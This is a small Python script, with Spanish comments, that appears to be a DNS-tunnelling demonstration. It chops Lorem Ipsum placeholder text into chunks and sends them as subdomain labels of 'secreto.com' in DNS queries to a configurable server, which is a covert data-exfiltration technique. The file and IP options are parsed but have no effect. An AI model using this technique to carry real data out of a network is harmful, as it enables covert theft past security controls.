import dns.message
import dns.name
import dns.query
import socket
import argparse

ip = "127.0.0.1"
server = (ip, 53)
#Dominio al que vamos a enviar las peticiones
dominio = "secreto.com"
buffer = 4096
file = "archivo.txt"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

cadenas = []

#Guardamos cadenas de 48 caracteres para poder enviarlas con el dominio
def reorganize_text(text):
	
	i = 0
	max_caracters = 47
	
	while i < len(text):
		init = i
		end = i + max_caracters
		cadenas.append(text[init:end])
		i = end
		print(cadenas)
		print("OFASO")


def dns_requests():

	print("  -|-  INICIANDO...  -|-  ")

	text = "El Lorem Ipsum fue concebido como un texto de relleno, formateado de una cierta manera para permitir la presentación de elementos gráficos en documentos, sin necesidad de una copia formal. El uso de Lorem Ipsum permite a los diseñadores reunir los diseños y la forma del contenido antes de que el contenido se haya creado, dando al diseño y al proceso de producción más libertad. Se cree ampliamente que la historia de Lorem Ipsum se origina con Cicerón en el siglo I aC y su texto De Finibus bonorum et malorum. Esta obra filosófica, también conocida como En los extremos del bien y del mal, se dividió en cinco libros. El Lorem Ipsum que conocemos hoy se deriva de partes del primer libro Liber Primus y su discusión sobre el hedonismo, cuyas palabras habían sido alteradas, añadidas y eliminadas para convertirlas en un latín sin sentido e impropio. No se sabe exactamente cuándo el texto"
	text = text.replace(".", "")
	#[0:47]

	print(cadenas)
	reorganize_text(text)

	for cadena in cadenas:

		print("Enviando: " + cadena)

		#Nombre de dominio
		print(cadena)
		nombre_dominio = dns.name.from_text(cadena + "." + dominio)

		#Creamos la solicitud DNS | escribimos el dominio y el tipo de peticion
		request = dns.message.make_query(nombre_dominio, dns.rdatatype.A)

		#Enviamos la solicitud
		dns.query.send_udp(sock, request, server)

		#Esperamos la respuesta del servidor
		response, server_ip = sock.recvfrom(buffer)

		#Traducimos la respuesta a ascii
		txt_response = response.decode("utf-8", errors="replace")

		print(txt_response)


def main():

	parser = argparse.ArgumentParser()

	parser.add_argument('-s', '--ip', type=str, nargs=1, help='IP you want to connect to')
	parser.add_argument('-f', '--file', type=str, nargs=1, help='File containing the message')

	args = parser.parse_args()

	if args.ip:
		ip = str(args.ip)
	if args.file:
		file = str(args.file)
	dns_requests()


if __name__ == '__main__':
	main()
